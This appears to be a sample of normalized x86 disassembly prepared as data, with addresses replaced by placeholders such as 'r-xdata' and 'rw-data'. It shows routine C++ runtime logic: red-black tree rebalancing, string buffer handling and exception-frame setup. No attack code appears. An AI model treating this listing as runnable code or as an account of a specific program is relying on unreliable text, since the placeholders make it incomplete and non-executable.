mov edx [ edx + 0x4 ]
mov ebx [ edx ]
mov dl [ ebx + 0x14 ]
test dl dl
jne r-xdata
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov ebx [ ecx + 0x8 ]
mov cl [ ebx + 0x14 ]
test cl cl
jne r-xdata
mov eax [ ebp - 0x11c ]
dec eax
mov eax 0x1
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ edx ]
cmp eax ecx
jne r-xdata
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x14 ] 0x1
mov [ ebx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x8 ]
cmp eax edx
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ ebx + 0x14 ] 0x1
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] 0x0
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x34 ]
cmp edi ecx
jbe r-xdata
lea edx [ ebp - 0x58 ]
push edx
call sub_4bbca8
pop ecx
cmp edi eax
jbe r-xdata
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0x90 ]
sub edx ecx
mov [ ebp - 0x94 ] edx
mov eax [ ebp - 0x94 ]
cmp edi eax
jae r-xdata
lea eax [ ebp - 0x58 ]
push eax
call sub_4bc8cc
pop ecx
sub eax edx
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x90 ]
cmp eax ecx
jae r-xdata
mov dl 0x1
mov eax [ ebp - 0x38 ]
add ecx eax
cmp ecx rw-data
ja r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ebx [ edx + 0x8 ]
mov ecx [ ebx ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebx ]
mov cl [ ecx + 0x15 ]
test cl cl
jne r-xdata
mov eax [ eax + 0x4 ]
mov edx eax
mov ecx [ edx ]
mov ebx [ ecx + 0x8 ]
mov [ edx ] ebx
mov ebx [ ecx + 0x8 ]
mov bl [ ebx + 0x15 ]
test bl bl
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x0
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ebx [ edx ]
mov ecx [ ebx + 0x8 ]
mov [ edx ] ecx
mov ecx [ ebx + 0x8 ]
mov cl [ ecx + 0x15 ]
test cl cl
jne r-xdata
mov eax [ eax + 0x4 ]
mov edx eax
mov ecx [ edx + 0x8 ]
mov ebx [ ecx ]
mov [ edx + 0x8 ] ebx
mov ebx [ ecx ]
mov bl [ ebx + 0x15 ]
test bl bl
jne r-xdata
test edi edi
jne r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ ebp - 0x58 ]
push eax
push edi
push edx
call sub_408678
add esp 0xc
jmp r-xdata
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x58 ]
cmp edx ecx
jne r-xdata
mov [ ebp - 0x94 ] edi
mov ecx [ edx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x28 ]
mov ecx [ ecx + 0x4 ]
cmp edx ecx
jne r-xdata
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edx
mov ebx [ edx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ esi + 0x28 ]
mov ebx [ ebx + 0x4 ]
cmp edx ebx
jne r-xdata
mov ebx [ ecx + 0x8 ]
mov [ ebx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0x28 ]
mov ecx [ ecx + 0x4 ]
cmp edx ecx
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov ebx [ edx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ esi + 0x28 ]
mov ebx [ ebx + 0x4 ]
cmp edx ebx
jne r-xdata
mov ebx [ ecx ]
mov [ ebx + 0x4 ] edx
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x135 ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x94 ]
mov [ ebp - 0xdc ] eax
lea edx [ ebp - 0x50 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0xe0 ] eax
mov ecx [ ebp - 0xe0 ]
cmp ecx 0x1
ja r-xdata
mov [ ebp - 0x98 ] 0xffffffff
mov eax [ ebp - 0x90 ]
mov edx [ ebp - 0x94 ]
add eax edx
mov [ ebp - 0x9c ] eax
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x9c ]
cmp ecx eax
jae r-xdata
mov ecx [ edx + 0x4 ]
mov ecx [ ecx ]
cmp edx ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ ecx + 0x4 ] ebx
jmp r-xdata
mov ebx [ edx + 0x4 ]
mov ebx [ ebx + 0x8 ]
cmp edx ebx
jne r-xdata
mov ebx [ esi + 0x28 ]
mov [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov ecx [ ecx + 0x8 ]
cmp edx ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ ecx + 0x4 ] ebx
jmp r-xdata
mov ebx [ edx + 0x4 ]
mov ebx [ ebx ]
cmp edx ebx
jne r-xdata
mov ebx [ esi + 0x28 ]
mov [ ebx + 0x4 ] ecx
jmp r-xdata
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xe0 ]
dec eax
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x9c ]
sub ecx eax
mov edx [ ebp - 0x98 ]
cmp ecx edx
jae r-xdata
lea edx [ ebp - 0x58 ]
push edx
call sub_4bc8cc
pop ecx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ edx + 0x4 ]
mov [ ecx ] ebx
jmp r-xdata
mov [ ebx ] edx
mov [ edx + 0x4 ] ebx
mov ebx [ edx + 0x4 ]
mov [ ebx ] ecx
mov ebx [ edx + 0x4 ]
mov [ ebx + 0x8 ] ecx
jmp r-xdata
mov [ ecx + 0x8 ] edx
mov [ edx + 0x4 ] ecx
mov ecx [ edx + 0x4 ]
mov [ ecx ] ebx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] ebx
jmp r-xdata
mov [ ebx + 0x8 ] edx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov ebx [ edx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ edx + 0x4 ]
mov [ ebx ] ecx
jmp r-xdata
mov [ ecx ] edx
mov [ edx + 0x4 ] ecx
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x13c ] edx
mov edx [ ebp - 0x13c ]
mov cl [ ebp - 0x135 ]
mov [ edx ] cl
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0xdc ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
call sub_4bbca8
pop ecx
mov edx [ ebp - 0xdc ]
cmp eax edx
jae r-xdata
mov edx [ ebp - 0x98 ]
test edx edx
jbe r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x9c ]
sub ecx eax
mov [ ebp - 0x98 ] ecx
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x15c ] ecx
mov eax [ ebp - 0x15c ]
cmp eax 0xffffffff
jbe r-xdata
lea edx [ ebp - 0x28 ]
push edx
call sub_4bc8cc
pop ecx
xor edx edx
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x158 ] eax
mov eax [ ebp - 0x158 ]
mov cl [ ebp - 0x151 ]
mov [ eax ] cl
mov eax [ ebp - 0x38 ]
test eax eax
jae r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0x140 ] ecx
push edi
push rw-data
mov eax [ ebp - 0x140 ]
push eax
call sub_4c4cb0
mov [ ebp - 0x141 ] 0x0
mov edx [ ebp - 0x34 ]
add esp 0xc
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0xdc ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x38 ]
push ecx
mov eax [ ebp - 0xdc ]
push eax
lea edx [ ebp - 0x58 ]
push edx
call sub_408678
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x90 ]
mov [ ebp - 0xbc ] eax
mov edx [ ebp - 0x38 ]
test edx edx
jae r-xdata
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x9c ]
sub ecx eax
mov edx [ ebp - 0x98 ]
sub ecx edx
mov [ ebp - 0xa0 ] ecx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x58 ]
cmp edx ecx
jne r-xdata
mov [ ebp - 0x15c ] 0xffffffff
mov [ ebp - 0x38 ] edi
add eax edi
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x148 ]
mov dl [ ebp - 0x141 ]
mov [ eax ] dl
mov eax [ ebp - 0xdc ]
test eax eax
seta dl
and edx 0x1
test dl dl
je r-xdata
mov [ ebp - 0xf9 ] 0x0
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0xbc ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x1a4 ] eax
lea edx [ ebp - 0x20 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x1a8 ] eax
mov ecx [ ebp - 0x1a8 ]
cmp ecx 0x1
ja r-xdata
mov [ ebp - 0x160 ] 0xffffffff
mov eax [ ebp - 0x15c ]
mov [ ebp - 0x164 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
cmp edx ecx
jae r-xdata
lea eax [ ebp - 0x58 ]
jmp r-xdata
mov ecx [ ebp - 0x94 ]
mov [ ebp - 0x104 ] ecx
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
test eax eax
jbe r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0xbc ] ecx
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0x9c ]
add eax edx
mov ecx [ ebp - 0x98 ]
add eax ecx
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x1a8 ]
dec eax
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
sub edx ecx
mov eax [ ebp - 0x160 ]
cmp edx eax
jae r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bc8cc
pop ecx
inc [ ebp - 0x60 ]
lea edx [ ebp - 0x30 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x60 ]
mov ecx rw-data
mov [ ebp - 0x30 ] ecx
lea eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x150 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x150 ]
push ecx
lea eax [ ebp - 0x20 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x151 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
add ecx eax
mov [ ebp - 0x100 ] ecx
mov edx [ ebp - 0x100 ]
mov cl [ ebp - 0xf9 ]
mov [ edx ] cl
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xbc ]
sub edx ecx
mov [ ebp - 0xc0 ] edx
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x9c ]
add edx eax
mov [ ebp - 0xa8 ] edx
mov ecx [ ebp - 0xa0 ]
push ecx
mov eax [ ebp - 0xa4 ]
push eax
mov edx [ ebp - 0xa8 ]
push edx
call sub_4c4cf8
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x98 ]
sub ecx eax
add esp 0xc
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0xac ]
mov [ ebp - 0xb0 ] edx
mov [ ebp - 0xb1 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1a4 ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4bbca8
pop ecx
mov edx [ ebp - 0x1a4 ]
cmp eax edx
jae r-xdata
mov eax [ ebp - 0x160 ]
test eax eax
jbe r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
sub edx ecx
mov [ ebp - 0x160 ] edx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0x90 ]
add edx eax
mov [ ebp - 0x108 ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
mov edx [ ebp - 0xb0 ]
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0xb8 ] eax
mov eax [ ebp - 0xb8 ]
mov cl [ ebp - 0xb1 ]
mov [ eax ] cl
mov eax [ ebp - 0x1a4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov eax [ ebp - 0x1a4 ]
push eax
lea edx [ ebp - 0x28 ]
push edx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x184 ] eax
mov edx [ ebp - 0x8 ]
test edx edx
jae r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x164 ]
sub edx ecx
mov eax [ ebp - 0x160 ]
sub edx eax
mov [ ebp - 0x168 ] edx
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0x10c ] eax
mov edx [ ebp - 0x104 ]
push edx
mov ecx [ ebp - 0x108 ]
push ecx
mov eax [ ebp - 0x10c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x94 ]
mov [ ebp - 0x110 ] edx
mov [ ebp - 0x111 ] 0x0
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov eax [ ebp - 0xbc ]
add edx eax
mov [ ebp - 0xc4 ] edx
mov ecx [ ebp - 0x34 ]
cmp ecx 0x10
jb r-xdata
mov eax [ ebp - 0x1a4 ]
test eax eax
seta dl
and edx 0x1
test dl dl
je r-xdata
mov [ ebp - 0x1c1 ] 0x0
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x184 ]
cmp eax edx
jae r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x110 ]
mov [ ebp - 0x38 ] edx
add eax edx
mov [ ebp - 0x118 ] eax
mov eax [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ eax ] cl
lea ecx [ ebp - 0x48 ]
mov ecx [ ebp - 0x48 ]
jmp r-xdata
mov [ ebp - 0xc8 ] eax
mov edx [ ebp - 0xc0 ]
push edx
mov ecx [ ebp - 0xc4 ]
push ecx
mov eax [ ebp - 0xc8 ]
push eax
call sub_4c4cf8
mov edx [ ebp - 0x38 ]
mov ecx [ ebp - 0xbc ]
sub edx ecx
add esp 0xc
mov [ ebp - 0xcc ] edx
mov eax [ ebp - 0xcc ]
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xd1 ] 0x0
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
inc [ ebp - 0x60 ]
inc [ ebp - 0x60 ]
mov eax rw-data
mov [ ebp - 0x30 ] eax
inc [ ebp - 0x60 ]
dec [ ebp - 0x60 ]
mov edx [ ebp - 0x34 ]
cmp edx 0x10
jb r-xdata
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0x1cc ] ecx
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x184 ]
test eax eax
jbe r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x184 ] ecx
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x164 ]
add ecx eax
mov edx [ ebp - 0x160 ]
add ecx edx
mov [ ebp - 0x16c ] ecx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0xd0 ]
mov [ ebp - 0x38 ] eax
add ecx eax
mov [ ebp - 0xd8 ] ecx
mov edx [ ebp - 0xd8 ]
mov cl [ ebp - 0xd1 ]
mov [ edx ] cl
jmp r-xdata
mov ecx 0xf
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x1e9 ] 0x0
mov eax [ ebp - 0x34 ]
cmp eax 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x1e4 ] ecx
mov eax [ ebp - 0x1e4 ]
mov [ ebp - 0x1e8 ] eax
mov edx [ ebp - 0x1e8 ]
push edx
call sub_4b0180
pop ecx
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x1c8 ] ecx
mov edx [ ebp - 0x1c8 ]
mov cl [ ebp - 0x1c1 ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x184 ]
sub edx ecx
mov [ ebp - 0x188 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x164 ]
add edx eax
mov [ ebp - 0x170 ] edx
mov ecx [ ebp - 0x168 ]
push ecx
mov eax [ ebp - 0x16c ]
push eax
mov edx [ ebp - 0x170 ]
push edx
call sub_4c4cf8
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x160 ]
sub ecx eax
add esp 0xc
mov [ ebp - 0x174 ] ecx
mov edx [ ebp - 0x174 ]
mov [ ebp - 0x178 ] edx
mov [ ebp - 0x179 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea edx [ ebp - 0x48 ]
mov edx [ ebp - 0x48 ]
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d0 ] edx
mov eax [ ebp - 0x4 ]
cmp eax 0x10
jb r-xdata
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x178 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x180 ] eax
mov eax [ ebp - 0x180 ]
mov cl [ ebp - 0x179 ]
mov [ eax ] cl
xor eax eax
mov [ ebp - 0x38 ] eax
add edx eax
mov [ ebp - 0x1f0 ] edx
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x1f0 ]
mov cl [ ebp - 0x1e9 ]
mov [ edx ] cl
mov [ ebp - 0x6c ] 0xc
push eax
push r-xdata
call sub_4d1c20
add esp 0x24
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x1d4 ] ecx
mov eax [ ebp - 0x1cc ]
push eax
mov edx [ ebp - 0x1d0 ]
push edx
mov eax [ ebp - 0x1d4 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x15c ]
mov [ ebp - 0x1d8 ] edx
mov [ ebp - 0x1d9 ] 0x0
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x184 ]
add edx eax
mov [ ebp - 0x18c ] edx
mov ecx [ ebp - 0x4 ]
cmp ecx 0x10
jb r-xdata
mov edx [ ebp - 0x1d8 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x1e0 ] eax
mov eax [ ebp - 0x1e0 ]
mov cl [ ebp - 0x1d9 ]
mov [ eax ] cl
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x190 ] eax
mov edx [ ebp - 0x188 ]
push edx
mov ecx [ ebp - 0x18c ]
push ecx
mov eax [ ebp - 0x190 ]
push eax
call sub_4c4cf8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x184 ]
sub edx ecx
add esp 0xc
mov [ ebp - 0x194 ] edx
mov eax [ ebp - 0x194 ]
mov [ ebp - 0x198 ] eax
mov [ ebp - 0x199 ] 0x0
mov edx [ ebp - 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax [ ebp - 0x198 ]
mov [ ebp - 0x8 ] eax
add ecx eax
mov [ ebp - 0x1a0 ] ecx
mov edx [ ebp - 0x1a0 ]
mov cl [ ebp - 0x199 ]
mov [ edx ] cl
jmp r-xdata
sub_41660c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
mov al [ esi + 0x15 ]
test al al
jne r-xdata
mov ecx [ eax + 0x8 ]
mov [ ebx + 0x8 ] ecx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx eax
add edx 0x15
mov dl [ edx ]
test dl dl
jne r-xdata
push esi
call sub_4088f4
pop ecx
mov [ ebx + 0x8 ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebx + 0x8 ]
mov dl [ ecx + 0x15 ]
test dl dl
jne r-xdata
mov edx [ eax ]
cmp ecx edx
je r-xdata
mov [ ebx + 0x8 ] eax
mov [ ebx + 0x8 ] eax
sub_41666c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x28 ]
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov bl 0x1
jmp r-xdata
mov al [ edi + 0x15 ]
test al al
je r-xdata
mov [ ebp - 0x4 ] edi
mov ebx edi
add ebx 0xc
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4d327c
mov ebx eax
test bl bl
je r-xdata
jmp r-xdata
mov edx [ edi + 0x8 ]
mov edx [ edi ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
test bl bl
mov edx eax
mov [ ebp - 0x20 ] edx
je r-xdata
mov edi edx
mov edi [ ebp + 0x10 ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
add eax 0xc
mov [ ebp - 0x14 ] eax
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4d327c
test al al
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x28 ]
mov eax [ eax ]
mov edi eax
mov [ ebp - 0x30 ] edi
cmp edi edx
sete al
and eax 0x1
test al al
je r-xdata
mov al 0x0
mov edx [ ebp - 0x28 ]
mov [ esi ] edx
mov edx [ ebp - 0x24 ]
mov [ esi + 0x4 ] edx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x10 ] al
mov eax esi
mov [ ebp - 0x15 ] 0x1
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
push ecx
push ebx
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x48 ]
push edx
call sub_415638
mov ecx [ ebp - 0x48 ]
add esp 0x14
mov [ esi ] ecx
mov ecx [ ebp - 0x44 ]
mov [ esi + 0x4 ] ecx
mov eax [ ebp - 0x40 ]
mov [ esi + 0x8 ] eax
mov eax esi
mov dl [ ebp - 0x15 ]
mov [ esi + 0x10 ] dl
jmp r-xdata
lea edx [ ebp - 0x28 ]
push edx
call sub_41660c
pop ecx
mov bl 0x1
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
push ecx
push 0x1
mov eax [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x58 ]
push edx
call sub_415638
add esp 0x14
mov ecx [ ebp - 0x58 ]
mov [ esi ] ecx
mov ecx [ ebp - 0x54 ]
mov [ esi + 0x4 ] ecx
mov eax [ ebp - 0x50 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] bl
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4167cc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax rw-data
call sub_4c517c
mov edi ebx
mov eax [ edi ]
mov [ esi ] eax
mov edx [ edi + 0x4 ]
mov [ esi + 0x4 ] edx
mov ecx [ edi + 0x8 ]
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ esi + 0x14 ] eax
mov edx [ edi + 0x18 ]
mov [ esi + 0x18 ] edx
mov ecx [ edi + 0x1c ]
mov [ esi + 0x1c ] ecx
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov edx [ edi + 0x24 ]
mov [ esi + 0x24 ] edx
mov ecx [ edi + 0x28 ]
mov [ esi + 0x28 ] ecx
mov eax [ edi + 0x2c ]
mov [ esi + 0x2c ] eax
mov edx [ edi + 0x30 ]
mov [ esi + 0x30 ] edx
lea edx [ esi + 0x3c ]
mov ecx [ edi + 0x34 ]
mov [ esi + 0x34 ] ecx
mov ecx edi
mov eax [ edi + 0x38 ]
add ecx 0x3c
mov [ esi + 0x38 ] eax
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x2c ] ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x28 ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov ecx [ edi + 0x40 ]
mov [ esi + 0x40 ] ecx
mov ecx [ edi + 0x44 ]
mov [ esi + 0x44 ] ecx
mov ecx [ edi + 0x48 ]
mov [ esi + 0x48 ] ecx
mov eax [ edi + 0x4c ]
mov [ esi + 0x4c ] eax
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov cl [ edi + 0x54 ]
mov [ esi + 0x54 ] cl
mov al [ edi + 0x55 ]
mov [ esi + 0x55 ] al
mov dl [ edi + 0x56 ]
mov [ esi + 0x56 ] dl
mov ecx [ edi + 0x58 ]
mov [ esi + 0x58 ] ecx
mov eax [ edi + 0x5c ]
mov [ esi + 0x5c ] eax
mov edx [ edi + 0x60 ]
mov [ esi + 0x60 ] edx
mov eax esi
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4168b4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov eax 0x1fffffff
test eax eax
ja r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov eax 0x1
sub_4168e0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x3
dec [ ebp - 0x8 ]
